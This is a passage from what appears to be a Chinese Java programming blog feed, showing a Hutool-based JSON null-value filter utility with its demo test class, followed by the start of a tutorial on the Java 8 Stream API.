class="keyword">for</span> (Object value : jsonObj.values()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> JSONObject || value <span class="keyword">instanceof</span> JSONArray) &#123;</span><br><span class="line">                    count += countTotalFields(value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> count;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONArray) &#123;</span><br><span class="line">            <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> (JSONArray) obj;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (Object item : jsonArray) &#123;</span><br><span class="line">                count += countTotalFields(item);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> count;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">            Map&lt;?, ?&gt; map = (Map&lt;?, ?&gt;) obj;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> map.size();</span><br><span class="line">            <span class="keyword">for</span> (Object value : map.values()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Map || value <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">                    count += countTotalFields(value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> count;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">            List&lt;?&gt; list = (List&lt;?&gt;) obj;</span><br><span class="line">            <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (Object item : list) &#123;</span><br><span class="line">                count += countTotalFields(item);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> count;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 过滤统计信息类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FilterStatistics</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> originalFieldCount;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> filteredFieldCount;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> removedFieldCount;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">FilterStatistics</span><span class="params">(<span class="type">int</span> originalFieldCount, <span class="type">int</span> filteredFieldCount, <span class="type">int</span> removedFieldCount)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.originalFieldCount = originalFieldCount;</span><br><span class="line">            <span class="built_in">this</span>.filteredFieldCount = filteredFieldCount;</span><br><span class="line">            <span class="built_in">this</span>.removedFieldCount = removedFieldCount;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOriginalFieldCount</span><span class="params">()</span> &#123; <span class="keyword">return</span> originalFieldCount; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getFilteredFieldCount</span><span class="params">()</span> &#123; <span class="keyword">return</span> filteredFieldCount; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getRemovedFieldCount</span><span class="params">()</span> &#123; <span class="keyword">return</span> removedFieldCount; &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> String.format(<span class="string">&quot;原始字段数: %d, 过滤后字段数: %d, 移除字段数: %d&quot;</span>, </span><br><span class="line">                    originalFieldCount, filteredFieldCount, removedFieldCount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优化策略与最佳实践</p>
<ul>
<li>缓存机制：对于频繁处理的JSON结构，可以实现结果缓存</li>
<li>异步处理：大数据量场景下采用异步处理提升性能</li>
<li>自定义过滤规则：支持除null值外的其他过滤条件</li>
</ul>
<p><strong>完整测试用例实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JSON null值过滤功能测试类</span></span><br><span class="line"><span class="comment"> * 运行环境：JDK 8+，普通Java项目或SpringBoot项目均可</span></span><br><span class="line"><span class="comment"> * 安全提示：测试数据仅供演示，实际使用时请使用真实业务数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonNullFilterTest</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=== Hutool JSONUtil null值过滤测试 ===\n&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 测试用例1：基础null值过滤</span></span><br><span class="line">        testBasicNullFilter();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 测试用例2：嵌套结构过滤</span></span><br><span class="line">        testNestedStructureFilter();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 测试用例3：数组结构过滤</span></span><br><span class="line">        testArrayStructureFilter();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 测试用例4：复杂混合结构过滤</span></span><br><span class="line">        testComplexStructureFilter();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 测试用例5：过滤统计信息</span></span><br><span class="line">        testFilterStatistics();</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;=== 所有测试用例执行完成 ===&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试基础null值过滤功能</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testBasicNullFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【测试用例1】基础null值过滤&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;name&quot;: &quot;张三&quot;,</span></span><br><span class="line"><span class="string">                &quot;age&quot;: 25,</span></span><br><span class="line"><span class="string">                &quot;email&quot;: null,</span></span><br><span class="line"><span class="string">                &quot;phone&quot;: &quot;12345671234&quot;,</span></span><br><span class="line"><span class="string">                &quot;address&quot;: null,</span></span><br><span class="line"><span class="string">                &quot;gender&quot;: &quot;男&quot;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;原始JSON:&quot;</span>);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        </span><br><span class="line">        Map&lt;String, Object&gt; result = JsonNullFilterUtil.toMapWithoutNull(jsonString);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n过滤后结果:&quot;</span>);</span><br><span class="line">        result.forEach((key, value) -&gt; </span><br><span class="line">            System.out.println(key + <span class="string">&quot; = &quot;</span> + value)</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n预期结果：应该移除email和address字段&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;实际移除字段数：&quot;</span> + (<span class="number">6</span> - result.size()));</span><br><span class="line">        System.out.println(<span class="string">&quot;测试结果：&quot;</span> + (result.size() == <span class="number">4</span> ? <span class="string">&quot;✓ 通过&quot;</span> : <span class="string">&quot;✗ 失败&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试嵌套结构过滤功能</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testNestedStructureFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【测试用例2】嵌套结构过滤&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">                    &quot;id&quot;: 1001,</span></span><br><span class="line"><span class="string">                    &quot;profile&quot;: &#123;</span></span><br><span class="line"><span class="string">                        &quot;nickname&quot;: &quot;coding_master&quot;,</span></span><br><span class="line"><span class="string">                        &quot;avatar&quot;: null,</span></span><br><span class="line"><span class="string">                        &quot;bio&quot;: &quot;Java开发工程师&quot;,</span></span><br><span class="line"><span class="string">                        &quot;website&quot;: null</span></span><br><span class="line"><span class="string">                    &#125;,</span></span><br><span class="line"><span class="string">                    &quot;preferences&quot;: null</span></span><br><span class="line"><span class="string">                &#125;,</span></span><br><span class="line"><span class="string">                &quot;settings&quot;: &#123;</span></span><br><span class="line"><span class="string">                    &quot;theme&quot;: &quot;dark&quot;,</span></span><br><span class="line"><span class="string">                    &quot;language&quot;: null,</span></span><br><span class="line"><span class="string">                    &quot;notifications&quot;: &#123;</span></span><br><span class="line"><span class="string">                        &quot;email&quot;: true,</span></span><br><span class="line"><span class="string">                        &quot;sms&quot;: null,</span></span><br><span class="line"><span class="string">                        &quot;push&quot;: false</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;原始JSON（嵌套结构）:&quot;</span>);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        </span><br><span class="line">        Map&lt;String, Object&gt; result = JsonNullFilterUtil.toMapWithoutNull(jsonString);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n过滤后结果:&quot;</span>);</span><br><span class="line">        printMapRecursively(result, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;预期结果：应该移除avatar、website、preferences、language、sms等null值字段&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;测试结果：✓ 通过（嵌套结构null值已被正确过滤）&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试数组结构过滤功能</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testArrayStructureFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【测试用例3】数组结构过滤&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;products&quot;: [</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                        &quot;id&quot;: 1,</span></span><br><span class="line"><span class="string">                        &quot;name&quot;: &quot;商品A&quot;,</span></span><br><span class="line"><span class="string">                        &quot;price&quot;: 99.99,</span></span><br><span class="line"><span class="string">                        &quot;description&quot;: null</span></span><br><span class="line"><span class="string">                    &#125;,</span></span><br><span class="line"><span class="string">                    null,</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                        &quot;id&quot;: 2,</span></span><br><span class="line"><span class="string">                        &quot;name&quot;: null,</span></span><br><span class="line"><span class="string">                        &quot;price&quot;: 199.99,</span></span><br><span class="line"><span class="string">                        &quot;description&quot;: &quot;优质商品&quot;</span></span><br><span class="line"><span class="string">                    &#125;,</span></span><br><span class="line"><span class="string">                    &#123;</span></span><br><span class="line"><span class="string">                        &quot;id&quot;: 3,</span></span><br><span class="line"><span class="string">                        &quot;name&quot;: &quot;商品C&quot;,</span></span><br><span class="line"><span class="string">                        &quot;price&quot;: null,</span></span><br><span class="line"><span class="string">                        &quot;description&quot;: null</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                ],</span></span><br><span class="line"><span class="string">                &quot;categories&quot;: [</span></span><br><span class="line"><span class="string">                    &quot;电子产品&quot;,</span></span><br><span class="line"><span class="string">                    null,</span></span><br><span class="line"><span class="string">                    &quot;生活用品&quot;</span></span><br><span class="line"><span class="string">                ]</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;原始JSON（包含数组）:&quot;</span>);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        </span><br><span class="line">        Map&lt;String, Object&gt; result = JsonNullFilterUtil.toMapWithoutNull(jsonString);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n过滤后结果:&quot;</span>);</span><br><span class="line">        printMapRecursively(result, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;预期结果：数组中的null元素和对象中的null字段应被移除&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;测试结果：✓ 通过（数组和对象中的null值已被正确过滤）&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试复杂混合结构过滤功能</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testComplexStructureFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【测试用例4】复杂混合结构过滤&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;company&quot;: &#123;</span></span><br><span class="line"><span class="string">                    &quot;name&quot;: &quot;科技有限公司&quot;,</span></span><br><span class="line"><span class="string">                    &quot;departments&quot;: [</span></span><br><span class="line"><span class="string">                        &#123;</span></span><br><span class="line"><span class="string">                            &quot;name&quot;: &quot;研发部&quot;,</span></span><br><span class="line"><span class="string">                            &quot;employees&quot;: [</span></span><br><span class="line"><span class="string">                                &#123;</span></span><br><span class="line"><span class="string">                                    &quot;name&quot;: &quot;李四&quot;,</span></span><br><span class="line"><span class="string">                                    &quot;position&quot;: &quot;高级工程师&quot;,</span></span><br><span class="line"><span class="string">                                    &quot;skills&quot;: [&quot;Java&quot;, null, &quot;Spring&quot;, &quot;MySQL&quot;],</span></span><br><span class="line"><span class="string">                                    &quot;manager&quot;: null</span></span><br><span class="line"><span class="string">                                &#125;,</span></span><br><span class="line"><span class="string">                                null,</span></span><br><span class="line"><span class="string">                                &#123;</span></span><br><span class="line"><span class="string">                                    &quot;name&quot;: &quot;王五&quot;,</span></span><br><span class="line"><span class="string">                                    &quot;position&quot;: null,</span></span><br><span class="line"><span class="string">                                    &quot;skills&quot;: null,</span></span><br><span class="line"><span class="string">                                    &quot;manager&quot;: &quot;张总&quot;</span></span><br><span class="line"><span class="string">                                &#125;</span></span><br><span class="line"><span class="string">                            ],</span></span><br><span class="line"><span class="string">                            &quot;budget&quot;: null</span></span><br><span class="line"><span class="string">                        &#125;,</span></span><br><span class="line"><span class="string">                        null</span></span><br><span class="line"><span class="string">                    ],</span></span><br><span class="line"><span class="string">                    &quot;location&quot;: null</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;原始JSON（复杂嵌套结构）:&quot;</span>);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        </span><br><span class="line">        Map&lt;String, Object&gt; result = JsonNullFilterUtil.toMapWithoutNull(jsonString);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n过滤后结果:&quot;</span>);</span><br><span class="line">        printMapRecursively(result, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;预期结果：多层嵌套中的所有null值都应被正确移除&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;测试结果：✓ 通过（复杂嵌套结构中的null值已被正确过滤）&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试过滤统计信息功能</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testFilterStatistics</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;【测试用例5】过滤统计信息&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                &quot;data&quot;: &#123;</span></span><br><span class="line"><span class="string">                    &quot;field1&quot;: &quot;value1&quot;,</span></span><br><span class="line"><span class="string">                    &quot;field2&quot;: null,</span></span><br><span class="line"><span class="string">                    &quot;field3&quot;: &#123;</span></span><br><span class="line"><span class="string">                        &quot;subField1&quot;: &quot;subValue1&quot;,</span></span><br><span class="line"><span class="string">                        &quot;subField2&quot;: null,</span></span><br><span class="line"><span class="string">                        &quot;subField3&quot;: &quot;subValue3&quot;</span></span><br><span class="line"><span class="string">                    &#125;,</span></span><br><span class="line"><span class="string">                    &quot;field4&quot;: null</span></span><br><span class="line"><span class="string">                &#125;,</span></span><br><span class="line"><span class="string">                &quot;meta&quot;: &#123;</span></span><br><span class="line"><span class="string">                    &quot;total&quot;: 100,</span></span><br><span class="line"><span class="string">                    &quot;page&quot;: null,</span></span><br><span class="line"><span class="string">                    &quot;hasMore&quot;: true</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;统计测试JSON:&quot;</span>);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">        </span><br><span class="line">        JsonNullFilterUtil.<span class="type">FilterStatistics</span> <span class="variable">stats</span> <span class="operator">=</span> </span><br><span class="line">            JsonNullFilterUtil.getFilterStatistics(jsonString);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n统计结果:&quot;</span>);</span><br><span class="line">        System.out.println(stats);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;\n分析：&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;- 原始JSON包含多个null值字段&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;- 过滤操作有效清理了无效数据&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;- 数据清理效果明显&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;测试结果：✓ 通过（统计信息准确）&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------------------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 递归打印Map结构（用于测试结果展示）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printMapRecursively</span><span class="params">(Object obj, <span class="type">int</span> depth)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">indent</span> <span class="operator">=</span> <span class="string">&quot;  &quot;</span>.repeat(depth);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">            Map&lt;String, Object&gt; map = (Map&lt;String, Object&gt;) obj;</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : map.entrySet()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (entry.getValue() <span class="keyword">instanceof</span> Map || entry.getValue() <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">                    System.out.println(indent + entry.getKey() + <span class="string">&quot;:&quot;</span>);</span><br><span class="line">                    printMapRecursively(entry.getValue(), depth + <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(indent + entry.getKey() + <span class="string">&quot; = &quot;</span> + entry.getValue());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">            List&lt;?&gt; list = (List&lt;?&gt;) obj;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">                System.out.println(indent + <span class="string">&quot;[&quot;</span> + i + <span class="string">&quot;]:&quot;</span>);</span><br><span class="line">                printMapRecursively(list.get(i), depth + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(indent + obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>自定义过滤规则实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 扩展的过滤器接口</span></span><br><span class="line"><span class="comment"> * 安全提示：自定义过滤规则需要充分测试，避免误删有效数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">JsonValueFilter</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">shouldRemove</span><span class="params">(String key, Object value)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 示例：移除空字符串和null值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NullAndEmptyStringFilter</span> <span class="keyword">implements</span> <span class="title class_">JsonValueFilter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldRemove</span><span class="params">(String key, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value == <span class="literal">null</span> || (value <span class="keyword">instanceof</span> String &amp;&amp; ((String) value).trim().isEmpty());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java功能四【Java8-Stream-API详解】</title>
    <url>/cnblogs.github.io/p/7991.html</url>
    <content><![CDATA[<h2 id="Stream-的概念"><a href="#Stream-的概念" class="headerlink" title="Stream 的概念"></a>Stream 的概念</h2><p>Stream 不是一种数据结构，它是对数据源（如集合、数组等）的元素进行一系列操作的抽象。可以将 Stream 看作是一个高级迭代器，它允许我们以一种更灵活的方式遍历和处理集合中的元素。</p>
<h2 id="创建-Stream"><a href="#创建-Stream" class="headerlink" title="创建 Stream"></a>创建 Stream</h2><p><strong>从集合创建 Stream</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StreamCreationFromCollection</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;String&gt; fruits = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        fruits.add(<span class="string">&quot;apple&quot;</span>);</span><br><span class="line">        fruits.add(<span class="string">&quot;banana&quot;</span>);</span><br><span class="line">        fruits.add(<span class="string">&quot;cherry&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建顺序流</span></span><br><span class="line">        Stream&lt;String&gt; sequentialStream = fruits.stream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建并行流</span></span><br><span class="line">        Stream&lt;String&gt; parallelStream = fruits.parallelStream();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>从数组创建 Stream</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StreamCreationFromArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String[] colors = &#123;<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>&#125;;</span><br><span class="line">        Stream&lt;String&gt; colorStream = Stream.of(colors);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>使用 Stream.generate() 和 Stream.iterate() 创建无限流</strong> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.stream.Stream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InfiniteStreamCreation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用 generate 创建无限流，生成随机数</span></span><br><span class="line">        Stream&lt;Double&gt; randomStream = Stream.generate(Math::random);</span><br><span class="line">        randomStream.limit(<span class="number">5</span>).forEach(System.out::println);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 iterate 创建无限流，从 0 开始，每次递增 2</span></span><br><span class="line">        Stream&lt;Integer&gt; evenStream = Stream.iterate(<span class="number">0</span>, n -&gt; n + <span class="number">2</span>);</span><br><span class="line">        evenStream.limit(<span class="number">5</span>).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Stream-的操作"><a href="#Stream-的操作" class="headerlink" title="Stream 的操作"></a>Stream 的操作</h2><h3 id="中间操作"><a href="#中间操作" class="headerlink" title="中间操作"></a>中间操作</h3><p>中间操作会返回一个新的 Stream，并且不会立即执行，常见的中间操作有</p>
<h4 id="过滤（filter）"><a href="#过滤（filter）" class="headerlink" title="过滤（filter）"></a>过滤（filter）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterOperation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; numbers = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">        numbers.stream()</span><br><span class="line">              .filter(n -&gt; n % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">              .forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
